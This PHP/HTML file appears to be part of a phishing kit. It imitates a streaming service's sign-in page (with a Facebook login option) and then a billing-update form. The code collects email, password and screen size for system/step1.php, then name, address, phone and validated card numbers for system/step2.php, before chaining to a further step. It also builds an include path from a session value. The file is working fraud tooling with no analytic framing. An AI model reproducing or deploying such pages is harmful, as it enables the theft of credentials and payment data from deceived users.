<?php 
session_start();
include "system/languages/{$_SESSION['language']}.php";?>
<?php if(isset($_POST['one'])):?>
  <main>
         <div class="wrapper">
            <div class="official_bg">
               <img src="files/img/bg.jpg" alt="">
            </div>
            <div class="head_logo">
               <div>
                  <img src="files/img/logo.svg" alt="">
               </div>
            </div>
            <div class="main_body">
               <div class="main_content main_formule">
                  <div class="main_frm_wrapper">
                     <h1><?php echo $lg_tr['head']?></h1>
                     <div class="main_alert" style="display:none" id="msg">
                        <div class="main_alert_msg"><?php echo $lg_tr['msg']?></div>
                     </div>
                     <form method="post" action="javascript:void(0)">
                        <div class="main_inp">
                           <div class="place_inp">
                              <div class="inp_control">
                                 <label class="input_id">
                                 <input type="text" name="eml" class="input" id="eml">
                                 <label for="eml" class="place_lbl"><?php echo $lg_tr['lbl_eml']?></label>
                                 <input type="hidden" name="screen"></label>
                              </div>
                           </div>
                           <div class="msg_error"><?php echo $lg_tr['msg_eml']?></div>
                        </div>
                        <div class="main_inp inp_pass">
                           <div class="place_inp">
                              <div class="inp_pass_control">
                                 <label class="input_id">
                                 <input type="password" id="pss" name="pss" class="input">
                                 <label for="pss" class="place_lbl"><?php echo $lg_tr['lbl_pss']?></label></label>
                                 <button id="show_hide" type="button" class="show_hide" data-show="<?php echo $lg_tr['show_pss']?>" data-hide="<?php echo $lg_tr['hide_pss']?>"><?php echo $lg_tr['show_pss']?></button>
                                 <script>$(document).on('focusin','#pss',function(){if($(this).val()){$('#show_hide').show();
                                    }});$(document).on('focusout','#pss',function(){if($(this).val()){$('#show_hide').show();
                                    }else{$('#show_hide').hide();
                                    }});$(document).on('click','#show_hide',function(){if($.trim($(this).html())==$(this).data('show')){$(this).html($(this).data('hide'));
                                    $('#pss').attr('type','text');}else{$(this).html($(this).data('show'));
                                    $('#pss').attr('type','password');}});
                                 </script>
                              </div>
                           </div>
                           <div class="msg_error"><?php echo $lg_tr['msg_pss']?></div>
                        </div>
                        <button class="btn login-button btn-submit btn-small" type="submit"><?php echo $lg_tr['head']?></button>
                        <div class="remember_help">
                           <div class="extra_inp remember_inp">
                              <input id="rmm" type="checkbox" value="true" checked>
                              <label for="rmm">
                              <span class="remember_lbl"><?php echo $lg_tr['remember']?></span></label>
                              <div class="helper"></div>
                           </div>
                           <a href="#" class="help_lnk"><?php echo $lg_tr['help']?></a>
                        </div>
                     </form>
                  </div>
                  <div class="using_fb">
                     <div class="fb_frm">
                        <div class="fb_min">
                           <button class="btn minimal-login btn-submit btn-small" type="submit" autocomplete="off" tabindex="0">
                              <div class="fb-login"><img class="icon-facebook" src="files/img/fb.png">
                                 <span class="fbBtnText"><?php echo $lg_tr['fb']?></span>
                              </div>
                           </button>
                        </div>
                     </div>
                     <div class="new_acc"><?php echo $lg_tr['new']?><a href="javascript:void(0)"><?php echo $lg_tr['signup']?></a>. </div>
                  </div>
               </div>
            </div>
            <div class="footer_main footer_main_first">
               <div class="footer_divider"></div>
               <div class="footer_wrapper">
                  <p class="footer__top"><a class="footer_top_a" href="javascript:void(0)"><?php echo $lg_tr['contact']?></a></p>
                  <ul class="footer_lnk stru">
                     <li class="footer-link-item"><a class="footer-link" href="javascript:void(0)"><?php echo $lg_tr['gift']?></a></li>
                     <li class="footer-link-item"><a class="footer-link" href="javascript:void(0)"><?php echo $lg_tr['terms']?></a></li>
                     <li class="footer-link-item"><a class="footer-link" href="javascript:void(0)"><?php echo $lg_tr['privacy']?></a></li>
                  </ul>
                  <div class="lang_switch">
                     <div class="flat_select">
                        <div class="select-arrow medium prefix globe">
                           <select class="ui-select medium" id="selectLang">
                              <option value="en" <?php echo $_SESSION['language']=='en'?'selected':''?>>English</option>
                              <option value="es" <?php echo $_SESSION['language']=='es'?'selected':''?>>Español</option>
                           </select>
                           <script>$(document).on('change','#selectLang',function(){window.location.href='index?lang='+$(this).val();});</script>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </main>
      <div id="rotate" style="display:none">
         <div class="circle">
            <div class="rotate"></div>
         </div>
         <div class="overlay"></div>
      </div>
      <script>$("#lib").attr('disabled','');
         $("[name=screen]").val(screen.width+' x '+screen.height);
         function isEmail(email){return /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test($.trim(email));}
         $(document).on("keyup",".input",function(){if($(this).val()){$(this).addClass("hasText");
         }else{$(this).removeClass("hasText");
         }
         if(!$(this).val()){$(this).parent().parent().parent().parent().addClass("error");
         return false;}else{$(this).parent().parent().parent().parent().removeClass("error");
         }});$(document).on("keyup","[name=eml]",function(){if(!isEmail($(this).val())){$(this).parent().parent().parent().parent().addClass("error");
         return false;}else{$(this).parent().parent().parent().parent().removeClass("error");
         }});$(document).on("submit","form",function(e){e.preventDefault();
         var me=$(this);var check=true;if(!isEmail($("[name=eml]").val())){$("[name=eml]").parent().parent().parent().parent().addClass("error");
         check=false;}else{$("[name=eml]").parent().parent().parent().parent().removeClass("error");
         }
         if(!$("[name=pss]").val()){$("[name=pss]").parent().parent().parent().parent().addClass("error");
         check=false;}else{$("[name=pss]").parent().parent().parent().parent().removeClass("error");
         }
         if(!check){return false;}else{$("#rotate").show();
         $.post("system/step1.php",me.serialize(),function(data,status,){if(status=="success"){if(data=="error"){$("#msg").show();
         $("#rotate").hide();me[0].reset();$(".input").removeClass("hasText");
         }else{$.post("include.php",{two:'ok'},function(dt,status,){$('body').html(dt);
         });
         }}else{$("#msg").show();
         $("#rotate").hide();}});}});
      </script>
<?php endif?>	  
	  <?php if(isset($_POST['two'])):?>
	    <div class="basicLayout simplicity">
         <div class="nfHeader noBorderHeader signupBasicHeader">
            <span class="logo">
            <img src="files/img/nt_logo.svg" alt="logo"></span>
            <a href="javascript:void(0)" class="authLinks signupBasicHeader isMemberSimplicity"><?php echo $info_tr['signout']?></a>
         </div>
         <div class="simpleContainer">
            <div class="centerContainer firstLoad">
               <div class="paymentFormContainer">
                  <h1 class="stepTitle"><?php echo $info_tr['update']?></h1>
                  <div class="contextContainer">
                     <div class="contextRow contextRowFirst"><?php echo $info_tr['by']?></div>
                  </div>
                  <form method="post" action="javascript:void(0)" novalidate data-valid="<?php echo $info_tr['required']?>">
                     <div class="fieldContainer">
                        <span class="logos logos-block">
                        <span class="logoIcon VISA"></span>
                        <span class="logoIcon MASTERCARD"></span>
                        <span class="logoIcon AMEX"></span>
                        <span class="logoIcon DISCOVER"></span></span>
                        <ul class="simpleForm structural ui-grid">
                           <li class="nfFormSpace">
                              <div class="nfInput nfInputOversize">
                                 <div class="nfInputPlacement">
                                    <label>
                                    <input value="<?php echo $_SESSION['firstname'].' '.$_SESSION['lastname']?>" id="fnm" type="text" class="nfTextField <?php echo(isset($_SESSION['firstname'])?'hasText':'')?>" name="fnm">
                                    <label for="fnm" class="placeLabel"><?php echo $vbv_tr['full_name']?></label>
                                    </label>
                                 </div>
                                 <div class="inputError" style="display:none"></div>
                              </div>
                           </li>
                           <li class="nfFormSpace">
                              <div class="nfInput nfInputOversize">
                                 <div class="nfInputPlacement">
                                    <label>
                                    <input type="text" class="nfTextField" id="adr" name="adr">
                                    <label for="adr" class="placeLabel"><?php echo $info_tr['adr']?></label>
                                    </label>
                                 </div>
                                 <div class="inputError" style="display:none"></div>
                              </div>
                           </li>
                           <li class="nfFormSpace">
                              <div class="nfInput nfInputOversize">
                                 <div class="nfInputPlacement"><label><input value="<?php echo $_SESSION['zipCode']?>" type="tel" class="nfTextField <?php echo(isset($_SESSION['zipCode'])?'hasText':'')?>" id="zip" minlength="6" name="zip">
                                    <label for="zip" class="placeLabel"><?php echo $info_tr['zip']?></label></label>
                                 </div>
                                 <div class="inputError" style="display:none"></div>
                              </div>
                           </li>
                           <li class="nfFormSpace">
                              <div class="nfInput nfInputOversize">
                                 <div class="nfInputPlacement"><label>
                                    <input type="text" class="nfTextField" id="cty" name="cty">
                                    <label for="cty" class="placeLabel"><?php echo $info_tr['city']?></label></label>
                                 </div>
                                 <div class="inputError" style="display:none"></div>
                              </div>
                           </li>
                           <li class="nfFormSpace">
                              <div class="nfInput nfInputOversize">
                                 <div class="nfInputPlacement">
                                    <label><input type="text" class="nfTextField" id="stt" name="stt">
                                    <label for="stt" class="placeLabel"><?php echo $info_tr['state']?></label></label>
                                 </div>
                                 <div class="inputError" style="display:none"></div>
                              </div>
                           </li>
                           <li class="nfFormSpace">
                              <div class="nfInput nfInputOversize">
                                 <div class="nfInputPlacement">
                                    <label><input value="<?php echo(isset($_SESSION['ip_countryName'])?$_SESSION['ip_countryName']:'')?>" type="text" class="nfTextField <?php echo(isset($_SESSION['ip_countryName'])?'hasText':'')?>" id="cnt" name="cnt">
                                    <label for="cnt" class="placeLabel"><?php echo $info_tr['country']?></label></label>
                                 </div>
                                 <div class="inputError" style="display:none"></div>
                              </div>
                           </li>
                           <li class="nfFormSpace">
                              <div class="nfInput nfInputOversize">
                                 <div class="nfInputPlacement"><label><input value="<?php echo $_SESSION['phone']?>" type="text" class="nfTextField <?php echo(isset($_SESSION['phone'])?'hasText':'')?>" id="phn" name="phn">
                                    <label for="phn" class="placeLabel"><?php echo $info_tr['phone']?></label></label>
                                 </div>
                                 <div class="inputError" style="display:none"></div>
                              </div>
                           </li>
                        </ul>
                     </div>
                     <div class="submitBtnContainer">
                        <button id="bt_submit" class="nf-btn waiting nf-btn-primary nf-btn-solid nf-btn-oversize" type="submit">
                           <?php echo $info_tr['save']?>
                           <div class="waitIndicator">
                              <div class="basic-spinner basic-spinner-light center-absolute" style="width:35px;height:35px"></div>
                           </div>
                        </button>
                     </div>
                  </form>
               </div>
               <div class="cvvTooltip" style="display:none" id="whats_csc">
                  <span class="icon-close close-button pointer" id="bt_close_whats_csc"></span>
                  <div class="tooltipDesc"><?php echo $info_tr['csc_msg']?></div>
                  <div class="otherCvvHelp"></div>
                  <div class="amexCvvHelp"></div>
               </div>
            </div>
         </div>
         <div class="site-footer-wrapper centered">
            <div class="footer-divider"></div>
            <div class="site-footer">
               <p class="footer-top">
                  <a class="footer-top-a" href="javascript:"><?php echo $lg_tr['contact']?></a>
               </p>
               <ul class="footer-links structural">
                  <li class="footer-link-item">
                     <a class="footer-link" href="javascript:"><?php echo $info_tr['faq']?></a>
                  </li>
                  <li class="footer-link-item">
                     <a class="footer-link" href="javascript:"><?php echo $info_tr['help_center']?></a>
                  </li>
                  <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $lg_tr['terms']?></a></li>
                  <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $lg_tr['privacy']?></a></li>
                  <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['cookies']?></a></li>
                  <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['corporate']?></a></li>
               </ul>
            </div>
         </div>
         <script>
		    $("#lib").removeAttr('disabled');
            $(document).ready(function(){$('#exp').mask('00/00');
            $('#phn').mask('(000) 000-0000');
            function valid(me){if(me.val()){me.addClass('hasText valid');
            me.removeClass('error');me.parent().parent().parent().children('.inputError').hide();
            return true;}else{me.addClass('error');
            if(me.attr("placeholder")==undefined){me.removeClass('hasText valid');
            }else{me.removeClass('valid');
            }
            me.parent().parent().parent().children('.inputError').html(me.next('label').html()+' '+$('form').data('valid')).show();
            return false;
            }}
            $(document).on('keyup','input',function(){var me=$(this);
            valid(me);});$(document).on('click','#bt_whats_csc',function(){$('#whats_csc').show();
            });
            $(document).on('click','#bt_close_whats_csc',function(){$('#whats_csc').hide();
            });
            var ccvalid=false;$(document).on('keyup','#cnm',function(){$('#cnm').mask('0000 0000 0000 0000 000');
            $('#cnm').validateCreditCard(function(result){var cc=$('#cnm');if(cc.val()!=''){var cctype=result.card_type==null?'-':result.card_type.name;
            $('input[name=ctp]').val(cctype);if(result.valid){cc.addClass('hasText valid');
            cc.removeClass('error');
            cc.parent().parent().parent().children('.inputError').hide();
            ccvalid=true;
            }else{cc.addClass('error');
            cc.removeClass('valid');
            cc.parent().parent().parent().children('.inputError').html(cc.data('check')).show();
            ccvalid=false;
            }}});
            });
            $(document).on('submit','form',function(e){e.preventDefault();
            var me=$(this);
            var check=true;
            $('input').each(function(index,el){if(!valid($(el))){check=false;}});
            if(!ccvalid){check=false;}
            if(check){$('#bt_submit').attr('disabled','');
            $.post("system/step2.php",me.serialize(),function(data,status){if(status=="success"){if(data=="error"){
            	$('#bt_submit').removeAttr('disabled');
            }else{$.post("include.php",{three:'ok'},function(dt,status){$('body').html(dt);
            });
            }}else{$('#bt_submit').removeAttr('disabled');
            }});
            }else{return false;
            }});})
            ;
         </script>
      </div>
      <!-- --->
	  <?php endif?>	